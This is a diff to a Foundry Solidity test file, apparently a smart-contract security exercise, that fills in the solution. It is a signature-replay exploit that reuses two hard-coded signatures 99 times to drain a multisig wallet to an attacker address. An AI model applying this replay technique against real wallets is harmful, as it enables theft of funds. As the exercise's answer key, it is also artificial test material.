@@ -24,7 +24,9 @@ contract TestRA1 is Test {
     address attacker = makeAddr("attacker");
 
     function setUp() public {
-        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+        /**
+         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
+         */
         (deployer, deployerKey) = makeAddrAndKey("deployer");
         (signer2, signer2Key) = makeAddrAndKey("signer2");
 
@@ -63,8 +65,24 @@ contract TestRA1 is Test {
     }
 
     function testWallet() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        vm.startPrank(attacker);
+        uint8 v1 = 27;
+        bytes32 r1 = 0x1ddabf42460a80d2780a214aeec06787c1feb8046f4a88662db254e1ea1c15db;
+        bytes32 s1 = 0x1ddb0931fa6572af9ea5bab4c7afd0779a095beb68a9ca160c8b23647d63f7f9;
 
+        uint8 v2 = 27;
+        bytes32 r2 = 0xada7024b0ac3b997b1d05eedf4ba6020f1fdc92eaae47c2e9c6ec354ec86b075;
+        bytes32 s2 = 0x541172db522d0cc2ef6c651c8ef67b9f8fb858b394e239d8d1507e58356f787c;
+
+        Signature memory signature1 = Signature(v1, r1, s1);
+        Signature memory signature2 = Signature(v2, r2, s2);
+
+        for (uint256 index = 0; index < 99; index++) {
+            multiSigWallet.transfer(attacker, ATTACKER_WITHDRAW, [signature1, signature2]);
+        }
         /**
          * SUCCESS CONDITIONS
          */
